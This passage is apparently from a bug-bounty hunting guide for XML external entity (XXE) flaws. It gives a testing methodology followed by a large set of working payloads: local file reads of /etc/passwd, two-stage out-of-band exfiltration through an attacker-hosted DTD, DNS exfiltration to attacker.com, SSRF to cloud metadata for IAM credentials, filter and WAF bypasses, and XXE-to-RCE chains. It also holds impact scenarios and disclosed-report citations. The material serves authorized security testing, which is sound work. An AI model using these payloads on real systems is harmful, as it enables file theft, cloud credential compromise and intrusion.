- **Ruby**: `Nokogiri` older versions, `REXML`
- **Node.js**: `xml2js`, `libxmljs`, `fast-xml-parser` (older versions)
- **WSDL/SOAP services**: Always test — legacy XML parsing virtually guaranteed
- **File parsers**: Apache POI (Java), python-docx, LibreOffice integrations

---

## Step-by-Step Hunting Methodology

1. **Map every XML entry point** — Use Burp Suite passive scanner to flag all requests/responses with XML content types. Also intercept JSON endpoints and manually swap `Content-Type` to `application/xml` with equivalent XML body.

2. **Identify file upload features** — Upload SVG, DOCX, XLSX, and observe if the server processes/renders content. These are often XML under the hood.

3. **Attempt inline XXE (classic file read)** — Replace the XML body with a basic entity test payload targeting `/etc/passwd` or `C:\Windows\win.ini`. Observe if the value is reflected in the response.

4. **If no reflection, pivot to Blind OOB** — Set up an OOB listener (Burp Collaborator, interactsh, or a self-hosted netcat server). Inject an external entity pointing to your callback URL. Confirm DNS/HTTP hit to validate the parser is making outbound connections.

5. **Escalate Blind OOB to file exfiltration** — Use a two-stage payload: first entity loads local file, second entity sends it OOB via HTTP parameter or DNS exfiltration.

6. **Test SSRF pivot** — Point the external entity at internal network addresses (`http://169.254.169.254/latest/meta-data/`, `http://10.0.0.1/`, `http://localhost:8080/admin`). Look for differences in response timing or error messages.

7. **Test all subdomains sharing the same backend** — If one subdomain is vulnerable, enumerate and test all others systematically. Shared backend infrastructure means shared vulnerability.

8. **Test parameter-level injection** — Some endpoints parse only specific XML nodes. Inject entities into every element value, attribute value, and even element names.

9. **Test for error-based exfiltration** — If OOB is blocked, trigger XML parsing errors that include file content in the error message returned to the client.

10. **Document the full impact chain** — Demonstrate: file read → SSRF → internal service access → note which internal domains/IPs are reachable.

---

## Payload & Detection Patterns

### Error-based exfil via local-DTD repurposing (zero network egress)
When both `file://` outbound AND external-DTD fetch are blocked, reference a DTD already on disk and redefine one of its internal entities so the target file content leaks in the parse error:
```xml
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; err SYSTEM &#x27;file:///nonexist/%file;&#x27;>">
    %eval; %err;'>
  %local_dtd; ]>
```
Needs zero network egress. Local DTD paths differ per distro (yelp/docbookx is common) — enumerate. (PortSwigger: XXE by repurposing a local DTD.)

### Classic In-Band File Read
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>
```

### Windows Equivalent
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
]>
<root><data>&xxe;</data></root>
```

### Blind OOB — DNS/HTTP Callback
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://YOUR.BURPCOLLABORATOR.net/xxe-test">
]>
<root><data>&xxe;</data></root>
```

### Blind OOB — File Exfiltration via Parameter Entity (two-stage)
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://YOUR-SERVER/evil.dtd">
  %dtd;
]>
<root><data>trigger</data></root>
```

**evil.dtd (hosted on attacker server):**
```xml
<!ENTITY % all "<!ENTITY send SYSTEM 'http://YOUR-SERVER/?data=%file;'>">
%all;
```

### SSRF via XXE (AWS Metadata)
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<root><data>&ssrf;</data></root>
```

### SVG XXE (for file upload endpoints)
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<svg width="512px" height="512px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="14" x="0" y="16">&xxe;</text>
</svg>
```

### DOCX/XLSX XXE — Inject into `[Content_Types].xml` or `word/document.xml`
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<Types xmlns="..."><Default Extension="rels" ContentType="&xxe;"/></Types>
```

### Content-Type Swap (JSON to XML)
```bash
# Original JSON request
curl -X POST https://target.com/api/endpoint \
  -H "Content-Type: application/json" \
  -d '{"user":"test"}'

# Converted to XML for XXE testing
curl -X POST https://target.com/api/endpoint \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://COLLABORATOR.net">]><user>&xxe;</user>'
```

### Grep Patterns for Source Code Review
```bash
# PHP
grep -rn "simplexml_load_string\|DOMDocument\|xml_parse\|loadXML\|SimpleXMLElement" .

# Java
grep -rn "DocumentBuilder\|SAXParser\|XMLReader\|XMLInputFactory\|TransformerFactory" .

# Python
grep -rn "lxml\|xml.sax\|parseString\|fromstring\|etree.parse" .

# Look for missing hardening
grep -rn "FEATURE_EXTERNAL_GENERAL_ENTITIES\|setExpandEntityReferences\|setFeature.*false" .
```

---

## Common Root Causes

1. **Default parser configurations** — Java's `DocumentBuilderFactory`, PHP's `DOMDocument`, and Python's `lxml` all support external entities by default. Developers use them without reading the security docs.

2. **Framework upgrades without security re-review** — Older versions of Spring, Struts, and similar frameworks enabled XXE by default; developers didn't re-audit XML handling when libraries changed.

3. **Hidden XML consumption** — Developers accept JSON at the API layer but convert to XML internally, or use libraries (Apache POI, python-docx) to process uploads without realizing those formats are XML containers.

4. **Copy-paste code from StackOverflow** — XML parsing examples online rarely include entity disabling. Developers copy minimal working examples straight into production.

5. **SAML/SSO library misconfigurations** — SSO integrations often delegate XML parsing to third-party libraries with XXE enabled; developers assume "library handles security."

6. **Testing gaps on non-primary content types** — QA tests JSON APIs extensively; XML code paths receive minimal security testing because they're secondary or legacy.

7. **Microservice XML messaging** — Internal service-to-service communication uses XML (SOAP, custom schemas) and is treated as a "trusted internal" concern, bypassing security review.

---

## Bypass Techniques

### Defense: Keyword blacklist (`ENTITY`, `DOCTYPE`, `SYSTEM`)
```xml
<!-- Case variation -->
<!DoCtYpE foo [<!EnTiTy xxe SyStEm "file:///etc/passwd">]>

<!-- Encoding bypass -->
<?xml version="1.0" encoding="UTF-16"?>
(submit the entire payload UTF-16 encoded)

<!-- Parameter entity instead of general entity -->
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com"> %xxe;]>
```

### Defense: External entity fetching disabled (file:// blocked)
```xml
<!-- Try alternative URI schemes -->
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY xxe SYSTEM "netdoc:///etc/passwd">       <!-- Java -->
<!ENTITY xxe SYSTEM "jar:file:///etc/passwd!/">   <!-- Java -->
<!ENTITY xxe SYSTEM "gopher://internal-service:80/_GET%20/">
```

### Defense: WAF blocking XXE patterns
```xml
<!-- Chunked transfer encoding to bypass WAF inspection -->
Transfer-Encoding: chunked

<!-- HTTP request splitting with XML payload spread across chunks -->

<!-- Use XML comments to break signatures -->
<!-–- -->DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>

<!-- Nested encoding -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "&#x66;&#x69;&#x6c;&#x65;:///etc/passwd">]>
```

### Defense: Network egress filtering (OOB blocked)
```xml
<!-- DNS-only exfiltration (port 53 often allowed) -->
<!ENTITY % data SYSTEM "file:///etc/hostname">
<!ENTITY % send "<!ENTITY exfil SYSTEM 'http://%data;.attacker.com/'>">

<!-- Error-based exfiltration (no outbound needed) -->
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY % error SYSTEM 'file:///notexist/%file;'>">
  %eval; %error;
]>
```

### Defense: Content-Type validation
```
# Try mismatched Content-Type headers
Content-Type: application/json; charset=xml
Content-Type: application/xml+json
# Or simply omit Content-Type and let the server sniff
```

### Defense: Input length limits
```xml
<!-- Use billion laughs to test parser limits, and use short file paths -->
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;">
]>
<!-- Escalate to demonstrate DoS if XXE file-read is patched -->
```

---

## Parser-ecosystem vulnerability matrix

XXE classic payloads (`<!ENTITY xxe SYSTEM "file://...">`) are not universally exploitable in 2026. Most mainstream language ecosystems have hardened their default XML parsers since 2018-2024. Fingerprint the target stack BEFORE investing time in XXE — sometimes the parser is already safe and the bug class doesn't apply.

| Ecosystem / parser | Default behavior on SYSTEM entity | Vulnerable by default? |
|---|---|---|
| Java SAX / DOM (`XMLInputFactory` without disabling external entities) | Expands SYSTEM file:// | **YES** |
| Java JAXB / JAX-WS (older Spring versions) | Expands | **YES** |
| PHP `DOMDocument` with `LIBXML_NOENT` flag | Expands SYSTEM | **YES** |
| PHP `simplexml_load_*` with `LIBXML_NOENT` | Expands | **YES** |
| .NET `XmlDocument` with `XmlResolver` explicitly set | Expands | **YES** |
| .NET `XmlReader` with `DtdProcessing=Parse` + `XmlResolver` explicitly set | Expands | **YES** (default since .NET 4.5.2 is `DtdProcessing.Prohibit`, which THROWS on any DOCTYPE — modern default is safe) |
| Python `xml.etree.ElementTree` ≥ 3.7.1 | SYSTEM disabled | NO |
| Python `lxml` (verified 6.x; likely ≥ 5.x) | Drops SYSTEM file content even with `resolve_entities=True`; may still issue network fetches when `no_network=False` | NO for file read (verified locally on 6.1.0 — see `docs/verification/phase2g-saml-mfa-xxe.md`) |
| Python `xml.dom.minidom` | Default safe in current versions | NO |
| Python `defusedxml.lxml` | Disabled | NO |
| Ruby Nokogiri default | Disabled | NO |
| Ruby Nokogiri with `Nokogiri::XML::ParseOptions::DTDLOAD` | Expands | **YES** |
| Apache Struts (older) | Often expands | **YES** |
| Embedded IoT / industrial XML processors (firmware) | Frequently vulnerable | **YES** |
| Microsoft Office OOXML processors that re-parse user content | Vulnerable in some legacy paths | **YES** |

**Fingerprint signals to look for:**

- `Server: Apache Tomcat`, `X-Powered-By: Servlet` → Java backend → **likely YES**
- `X-Powered-By: PHP/...` + endpoint that ingests XML → **likely YES** if app uses `DOMDocument`
- `Server: Microsoft-IIS` with `.aspx` and XML SOAP → **likely YES** on legacy code
- Server says nothing identifiable + endpoint accepts XML → **probe with `&hello;` first**; if the inline entity expands, escalate to SYSTEM. If the inline entity also fails to expand, the parser may be hardened — pivot.

**Pre-Severity Gate:** before claiming XXE on a candidate endpoint, run the inline-entity probe (`<!ENTITY hello "world!">` then `&hello;` in a node). If `hello!` does NOT echo back, parser-level entity expansion is disabled and SYSTEM file:// won't work either. Don't waste cycles on a hardened parser.

---

## Gate 0 Validation

Before writing the report, answer all three:

1. **What can the attacker DO right now?**
   - Can you show the contents of `/etc/passwd` or `win.ini` in the response? OR can you demonstrate a confirmed OOB callback with a file's contents transmitted to your server? OR can you reach an internal SSRF endpoint (metadata, internal admin)?

2. **What does the victim LOSE?**
   - Specific sensitive data must be identified: internal credentials, AWS IAM keys, application config files with DB passwords, PII, or internal network topology. "Parser made a DNS request" alone is insufficient — escalate to demonstrate actual data exposure or internal access.

3. **Can it be reproduced in 10 minutes from scratch?**
   - You must have a single `curl` command or Burp repeater request that a triage engineer can run against the live target and see the impact within 10 minutes, with zero ambiguity about the vulnerable parameter and endpoint.

---

## Real Impact Examples

### Scenario A: Single Endpoint → 26 Domains Compromised (Uber-scale)
A tester discovered an XML parsing endpoint on one Uber subdomain. The backend processed XML using a vulnerable parser, and the server made outbound HTTP requests to attacker-controlled infrastructure (blind OOB). Because the vulnerable XML processing service was a shared internal microservice, the same vulnerability was reachable through 26+ different public-facing domains — all sharing the backend. A single payload could read `/etc/passwd`, internal config files, and reach AWS metadata endpoints, effectively giving access to credentials reusable across the entire infrastructure.

**Business impact**: Full internal service compromise across the majority of the production domain fleet; potential for credential theft and lateral movement.

### Scenario B: Document Upload → Local File Read on Twitter-scale Platform
An attacker uploaded a crafted XML-based document (e.g., SVG or Office format) to a document processing feature on a major social platform. The server-side parser processed the embedded DTD and external entity references, returning local file contents in the parsed output or error messages. The attacker could read application config files containing database connection strings, internal API keys, and potentially private user data stored on the same filesystem.

**Business impact**: Exposure of production secrets (database credentials, API keys) via a feature intended for harmless file uploads; no authentication bypass required beyond a standard user account.

### Scenario C: JSON API → Hidden XML Parser → SSRF to Internal Services
A REST API endpoint nominally accepting JSON was found to also parse requests submitted as `application/xml`. The underlying service converted XML to an internal format using an unpatched Java `DocumentBuilderFactory`. By injecting a SYSTEM entity pointing at `http://10.0.0.x` address ranges, the tester could probe internal services, reach an unauthenticated internal admin panel, and retrieve AWS instance metadata including temporary IAM credentials — all through a single API call requiring only a valid session token.

**Business impact**: Complete AWS credential compromise from a single authenticated API call, enabling privilege escalation from application-level user to cloud infrastructure administrator.

---

## Disclosed Report Citations (Backfill +6 — 2016-2024)

The following real, verified bug-bounty / coordinated-disclosure cases extend this skill. Three cases (#7, #9, #10) are OOB-required (blind) — they cross-reference the `hunt-ssrf` OOB-Or-It-Didn't-Happen Gate and cannot be claimed without a Collaborator/interactsh callback.

5. **Mail.ru — Pulse RSS/Atom feed XXE (file read)** ([H1 #505947](https://hackerone.com/reports/505947))
    - Subclass: direct file-read XXE (in-band)
    - Payload: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` inside RSS feed body → `<title>&xxe;</title>` reflected in response
    - Root cause: pulse.mail.ru RSS/Atom ingestion called an XML parser with `external general entities` enabled
    - Year: 2019 — **$6,000**

6. **Twitter — sms-be-vip.twitter.com SOAP/SXMP servlet XXE** ([H1 #248668](https://hackerone.com/reports/248668))
    - Subclass: SOAP XXE (cloudhopper SXMP servlet) — confirmed via HTTP callback **and** reflected file read
    - Payload: `<!DOCTYPE r [<!ENTITY % ext SYSTEM "http://attacker/x.dtd"> %ext;]>` chained in SXMP request body
    - Root cause: Cloudhopper SXMP servlet parsed inbound XML with default JAXP settings (entities resolved)
    - Year: 2017 — **$10,080** (classic SOAP-XXE reference case)

7. **Zivver — SVG profile-picture upload XXE → SSRF** ([H1 #897244](https://hackerone.com/reports/897244))
    - Subclass: SVG-upload XXE, OOB-confirmed, chains to SSRF
    - Payload: SVG with `<!DOCTYPE svg [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><text>&xxe;</text>`
    - Root cause: server thumbnailed uploaded SVG with an XML parser that resolved external entities; no entity-resolver shutdown
    - Year: 2020 — Zivver had no paid program at the time

8. **Open-Xchange — Blind XXE via PowerPoint (.pptx) import** ([H1 #334488](https://hackerone.com/reports/334488))
    - Subclass: Office-doc XXE (PPTX = ZIP of XML parts), OOB-required
    - Payload: modify `ppt/slides/slide1.xml` inside the .pptx ZIP to include `<!DOCTYPE x [<!ENTITY % a SYSTEM "http://attacker/d.dtd"> %a;]>`; external DTD chains parameter entities to exfil `file:///etc/passwd` over HTTP
    - Root cause: PowerPoint parser pre-rendered the XML parts of the OOXML container before disabling entity resolution
    - Year: 2018 — **$2,000**

9. **Uber — Blind OOB XXE on ubermovement.com** ([H1 #154096](https://hackerone.com/reports/154096))
    - Subclass: blind OOB XXE (third-party vendor product), OOB-required
    - Payload: `<!DOCTYPE r [<!ENTITY ping SYSTEM "http://attacker.example/">]><search><q>&ping;</q></search>`
    - Root cause: generic XML endpoint in Movement's vendor stack accepted XML and resolved system entities; no data exfil possible (sandboxed), only blind ping
    - Year: 2016 — **$500**

10. **Adobe Commerce / Magento — "CosmicSting" CVE-2024-34102** ([Assetnote writeup](https://www.assetnote.io/resources/research/why-nested-deserialization-is-harmful-magento-xxe-cve-2024-34102))
    - Subclass: XXE-to-RCE (nested deserialization → XXE in Laminas request body) — modern, exploited in the wild
    - Payload: REST API JSON request whose nested `simplexml_load_string()` reaches `<!DOCTYPE r [<!ENTITY % d SYSTEM "http://attacker/x.dtd"> %d;]>`; external DTD reads `app/etc/env.php` (admin crypt-key) and POSTs it back; key forges admin token → RCE
    - Root cause: `Laminas\Http\PhpEnvironment\Request` deserialized `simplexml_load_string` on attacker-controlled body without `LIBXML_NOENT` protections
    - Year: 2024 — Adobe HackerOne bounty paid, CVSS 9.8

---

## Related Skills & Chains

- **`hunt-ssrf`** — XXE is SSRF-with-XML-syntax once you discover the parser fetches external entities. Chain primitive: blind XXE OOB `<!ENTITY % x SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/role">` → exfil AWS IMDS creds via parameter-entity DTD callback → STS AssumeRole chain. Where pure SSRF is filter-blocked, `gopher://` via XXE-in-`libxml2` can still reach Redis/SMTP.
- **`hunt-file-upload`** — XXE most often hides inside file-upload features that quietly parse XML (DOCX/XLSX/PPTX, SVG, GPX, KML, OOXML, SOAP attachments). Chain primitive: upload DOCX with malicious `[Content_Types].xml` containing parameter-entity DTD → OOB file read of `/etc/passwd` / `web.config` / `.aws/credentials` via the document parser running server-side.
- **`hunt-rce`** — XXE → RCE is rare but real on PHP (`expect://`), Java (XSLT extensions with `<xsl:script>`/Xalan), and older XmlSpy/SAXON deployments. Chain primitive: XXE in a Java endpoint using a vulnerable XSLT processor → `<xsl:value-of select="rt:exec(rt:getRuntime(),'id')"/>` → RCE; or PHP XXE with `expect://id` stream wrapper enabled → direct RCE.
- **`hunt-sharepoint`** — On-prem SharePoint/Exchange/IIS stacks have a long history of XXE in SOAP/CSOM/EWS endpoints. Chain primitive: anonymous XXE in `_vti_bin/*.asmx` or EWS SOAP → read `web.config` → recover `<machineKey>` → ViewState deserialization → RCE (the ToolShell-adjacent precondition).
- **`security-arsenal`** — Reach for the XXE payload tree: standard SYSTEM file read, parameter-entity OOB DTD pattern (the `%` indirection that makes blind XXE work), `php://filter/convert.base64-encode/resource=` for binary-safe read, XInclude (`<xi:include href=...>`) when DOCTYPE is blocked, billion-laughs/quadratic-blowup for DoS, and the `jar://` / `netdoc://` Java-specific wrappers.
- **`triage-validation`** — Apply the Reproducibility + Pre-Severity Gates. An XXE that only triggers an OOB DNS callback with NO data exfil is Low/Medium (information disclosure of "this parser fetches entities"), not Critical. Critical needs proof of file read or internal HTTP — show the actual `/etc/passwd` content or the IMDS JSON response in the report.


